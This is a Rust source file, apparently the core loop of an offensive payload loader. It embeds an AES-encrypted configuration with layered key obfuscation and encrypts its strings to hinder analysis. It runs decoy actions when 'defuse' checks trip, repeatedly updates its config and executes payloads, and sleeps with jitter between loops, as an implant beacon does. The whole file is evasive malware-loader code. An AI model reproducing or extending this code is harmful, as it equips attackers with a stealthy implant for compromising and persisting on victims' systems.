use crate::config::CCC;
use crate::dataoperation::un_apply_all_dataoperations;
use crate::dataoperation::DO;
use crate::payload::PO;
//use crate::payload_util::print_running_thread;
//use crate::payload_util::print_runonce;
use crate::payload_util::print_rundata;
use crate::rundata::RunData;
//use crate::loader::service_malleable::run_service_malleable;
//use crate::loader::service_malleable::logservice;

use cryptify;
use cryptify::encrypt_string;
use std::thread;

extern crate env_logger;
use log::error;
use log::info;

// ------ STANDARD compilation
#[rustfmt::skip]
#[cfg(not(feature="ollvm"))]
const INITIAL_CONFIG_ENCRYPTED : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aes"));
#[rustfmt::skip]
#[cfg(not(feature="ollvm"))]
const OBFUSCATED_CONFIG_DECRYPT_KEY: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aes.dataop.obfuscated"));
#[rustfmt::skip]
#[cfg(not(feature="ollvm"))]
const DECRYPT_KEY_OBFUSCATION_STEPS: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aes.dataop.obfuscated.dataop"));

// ------ OLLVM compilation from docker
#[rustfmt::skip]
#[cfg(feature="ollvm")]
const INITIAL_CONFIG_ENCRYPTED : &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aes");
#[rustfmt::skip]
#[cfg(feature="ollvm")]
const OBFUSCATED_CONFIG_DECRYPT_KEY: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aes.dataop.obfuscated");
#[rustfmt::skip]
#[cfg(feature="ollvm")]
const DECRYPT_KEY_OBFUSCATION_STEPS: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aes.dataop.obfuscated.dataop");

pub fn run_loader() {
    #[cfg(feature = "info")]
    #[cfg(not(feature = "debug"))]
    env_logger::builder()
        .filter_level(log::LevelFilter::Info)
        .init();

    #[cfg(feature = "debug")]
    env_logger::builder()
        .filter_level(log::LevelFilter::Debug)
        .init();

    cryptify::flow_stmt!();

    let session_id: String = uuid::Uuid::new_v4().to_string();
    info!("{}{}", encrypt_string!("[+] session_id "), session_id);
    info!("");

    let initial_config_encrypted = INITIAL_CONFIG_ENCRYPTED.to_vec();
    let obfuscated_config_decrypt_key = OBFUSCATED_CONFIG_DECRYPT_KEY.to_vec();
    let decrypt_key_obfuscation_steps_zlib = DECRYPT_KEY_OBFUSCATION_STEPS.to_vec();
    let decrypt_key_obfuscation_steps = un_apply_all_dataoperations(
        vec![DO::ZLIB],
        decrypt_key_obfuscation_steps_zlib,
    )
    .unwrap();
    let ope_for_data_op: Vec<DO> =
        serde_json::from_slice(decrypt_key_obfuscation_steps.as_slice()).unwrap();
    let initial_config_decrypt_key =
        un_apply_all_dataoperations(ope_for_data_op, obfuscated_config_decrypt_key).unwrap();
    let initial_config_decrypt_key_dataoperation: Vec<DO> =
        serde_json::from_slice(initial_config_decrypt_key.as_slice()).unwrap();

    info!("{}", encrypt_string!("[+] DECRYPT initial config"));
    let initial_config_decrypted = un_apply_all_dataoperations(
        initial_config_decrypt_key_dataoperation,
        initial_config_encrypted,
    )
    .unwrap();
    info!("{}", encrypt_string!("[+] DECRYPTED!"));

    let mut config: CCC = serde_json::from_slice(initial_config_decrypted.as_slice()).unwrap();
    info!("{}", encrypt_string!("[+] VERIFY initial config"));
    config.verify_newconfig_signature(&config).unwrap();
    info!("{}{}", encrypt_string!("[+] VERIFIED!"), "\n");

    let running_thread_payload: Vec<(thread::JoinHandle<()>, PO)> = vec![];
    let runonce_payload: Vec<PO> = vec![];
    let running_thread_decoy_update: Vec<(thread::JoinHandle<()>, PO)> = vec![];
    let runonce_decoy_update: Vec<PO> = vec![];
    let running_thread_decoy_payload: Vec<(thread::JoinHandle<()>, PO)> = vec![];
    let runonce_decoy_payload: Vec<PO> = vec![];
    
    let mut run_data = RunData {
        running_thread_payload: running_thread_payload,
        runonce_payload: runonce_payload,
        running_thread_decoy_update: running_thread_decoy_update,
        runonce_decoy_update: runonce_decoy_update,
        running_thread_decoy_payload: running_thread_decoy_payload,
        runonce_decoy_payload: runonce_decoy_payload,
        loop_nb: 1,
        session_id: session_id.clone(),
    };

    info!("{}", encrypt_string!("[+] RESTORE config from backup file"));
    config=config.restore_backup_config_from_file(&session_id,&run_data);
    info!("");

    loop {
        info!(
            "{}{}{}",
            encrypt_string!("[+] BEGIN LOOP "),
            run_data.loop_nb,
            encrypt_string!(" --------------------------------------------------------")
        );
        info!("{}{}", encrypt_string!("[+] Active LOADER: "), serde_json::to_string(&config).unwrap_or_default());

        info!("{}", encrypt_string!("[+] DEFUSE UPDATE config"));
        if config.stop_defuse(&config.defuse_update) {
            error!("{}", encrypt_string!("[!] DEFUSE STOP update config"));
            config.exec_decoy_update(&mut run_data);
            //TODO il faut terminer ici, ou laisser le choix mais permettre d'attendre que tout les thread terminent puis -> StopLoader() -> option dans cette payload, wait all thread, mais il a pas la liste des threads AAAH,
            //TODO ici on pourrait choisir de ne pas terminer en faire une loop via un param en plus run_forever. (par exemple pas Internet)
            //-> ou alors on fait une payload run forever qu'il ne faut utiliser que pour le decoy
            //TODO wait all thread to finish.
            //si on sleep pas , il est en run forever.... car il revient. ici.
        } else {
            if config.decoy_defuse_update_success {
                config.exec_decoy_update(&mut run_data);
            }

            info!("{}", encrypt_string!("[+] UPDATE config"));
            //TODO si on file une copie
            /* 
            let mut running_payload: Vec<Payload> = vec![];
            for t in &run_data.running_thread_payload {
                running_payload.push(t.1.clone());
            }
            */
            let run_data_copy: RunData =  run_data.clone();

            //TODO lui filer une copie du run data plutôt, mais pas prioritaire. comme ça il pourra aussi avoir les decoy qui run
            config = config.update_config(&session_id, &run_data_copy);
            info!("{}", encrypt_string!("[+] DEFUSE payload exec"));
            if config.stop_defuse(&config.defuse_payload) {
                error!("{}", encrypt_string!("[!] DEFUSE STOP the payload exec"));
                config.exec_decoy_payload(&mut run_data);
            } else {
                if config.decoy_defuse_payload_success {
                    config.exec_decoy_payload(&mut run_data);
                };
                info!("{}", encrypt_string!("[+] PAYLOADS exec"));
                config.exec_payloads(&mut run_data);
            }
        }

        print_rundata(&mut run_data);

        //DEBUG sale sur service SCM control
        //logservice("avant run_service_malleable");
        //run_service_malleable();
        //logservice("after run_service_malleable");
    

        //TODO wait all thread to finish -> new option
        config.sleep_and_jitt();
        info!(
            "{}{}{}{}",
            encrypt_string!("[+] END LOOP "),
            run_data.loop_nb,
            encrypt_string!(" ----------------------------------------------------------"),
            "\n"
        );
        run_data.loop_nb = run_data.loop_nb + 1;
    }
}
